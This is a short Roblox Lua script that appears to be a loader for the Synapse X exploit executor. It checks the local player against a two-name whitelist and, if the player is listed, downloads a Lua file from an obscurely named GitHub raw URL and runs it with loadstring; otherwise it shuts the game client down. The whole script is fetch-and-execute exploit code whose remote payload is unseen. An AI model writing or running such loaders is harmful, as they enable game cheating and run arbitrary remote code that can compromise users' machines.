whitelist = {
    ["Shadows_Overlord"] = true,
    ["ArticGamerNL"] = true
}

if syn then
    if whitelist[game.Players.LocalPlayer.Name] then
            loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/asdiasjiodasj/uihfasdiash/main/asdsdfgdfdfgdfgfasd.lua', true))()
else game:Shutdown()
end
end